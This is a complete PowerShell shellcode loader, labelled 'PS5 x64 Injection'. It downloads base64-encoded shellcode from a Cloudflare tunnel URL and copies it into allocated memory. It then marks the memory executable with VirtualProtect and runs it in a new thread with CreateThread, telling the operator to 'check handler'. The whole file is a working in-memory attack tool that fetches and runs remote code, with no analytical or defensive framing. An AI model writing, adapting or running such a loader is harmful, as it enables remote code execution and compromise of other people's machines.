$u='https://spots-benefit-herb-mods.trycloudflare.com/payloads/shellcode.txt?key=7fd57214ed9dddd9'
[Net.ServicePointManager]::SecurityProtocol='Tls12'

Write-Host "[*] PS5 x64 Injection"
Write-Host "[*] Downloading shellcode..."

try {
    $sc = [Convert]::FromBase64String((New-Object Net.WebClient).DownloadString($u))
    Write-Host "[+] Got $($sc.Length) bytes"
} catch {
    Write-Host "[-] Download failed: $_"
    return
}

# Self-inject using Marshal (most reliable)
Write-Host "[*] Allocating memory..."
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length)
Write-Host "[+] Allocated at: 0x$($mem.ToString('X'))"

Write-Host "[*] Copying shellcode..."
[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $mem, $sc.Length)

# Add-Type for VirtualProtect and CreateThread
$code = @"
using System;
using System.Runtime.InteropServices;
public class K {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    
    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}
"@
Add-Type $code

Write-Host "[*] Setting memory RWX..."
$old = [uint32]0
$size = [UIntPtr]::new([uint64]$sc.Length)
$result = [K]::VirtualProtect($mem, $size, 0x40, [ref]$old)
if ($result) {
    Write-Host "[+] VirtualProtect OK (was 0x$($old.ToString('X'))"
} else {
    Write-Host "[-] VirtualProtect failed!"
    return
}

Write-Host "[*] Creating thread..."
$tid = [uint32]0
$th = [K]::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [ref]$tid)
if ($th -ne [IntPtr]::Zero) {
    Write-Host "[+] Thread created: $tid"
    Write-Host "[*] Shellcode executing... check handler!"
    [K]::WaitForSingleObject($th, 0xFFFFFFFF) | Out-Null
} else {
    Write-Host "[-] CreateThread failed"
}
